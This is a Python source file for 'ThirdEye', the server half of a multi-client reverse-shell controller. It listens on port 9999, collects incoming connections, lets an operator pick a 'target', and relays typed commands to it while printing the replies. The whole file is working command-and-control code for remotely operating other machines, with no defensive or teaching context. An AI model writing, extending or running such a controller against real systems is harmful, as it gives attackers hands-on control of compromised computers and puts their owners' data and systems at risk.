import socket
import time
import threading
from queue import Queue


NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []


# Create Socket (allow to computer communicate)

def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error : " + str(msg))


# Binding socket with port and wait for connection

def socket_bind():
    try:
        global host
        global port
        global s
        #print("Binding Socket with port : " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket Binding error : " + str(msg) + "\n" + "Retrying....")
        time.sleep(5)
        socket_bind()


# Accept connection from multiple client and save into List

def accept_conections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\nConnection has been established " + address[0])
        except:
            print("Errors accepting connections ")


# Interactive Prompt to send commands remotely

def start_thirdeye():
    while True:
        cmd = input('ThirdEye> ')
        if cmd == 'list':
            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd)

            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized !! Try again  ")


# Display current connections

def list_connections():
    results = ' '
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)

        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n'
    print('--------Clients--------' + '\n' + results)


# select the target

def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print("You are now connecting to " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '> ', end="")
        return conn
    except:
        print("Not Valid selection")
        return None


# Sending commands to selected Client

def send_target_commands(conn):
    while True:
        try:
            cmd = input()

            if len(str.encode(cmd)) > 0:
                print('entered in if')
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
            if cmd == 'quit':
                break
        except:
            print('Connection was lost ')
            break


# Create Worker Thread

def create_worker():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do the next Job in Queue (1 to handle connection 2 to send commands)

def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_conections()
        if x == 2:
            start_thirdeye()
        queue.task_done()


# Each list item is a new JOB

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_worker()
create_jobs()
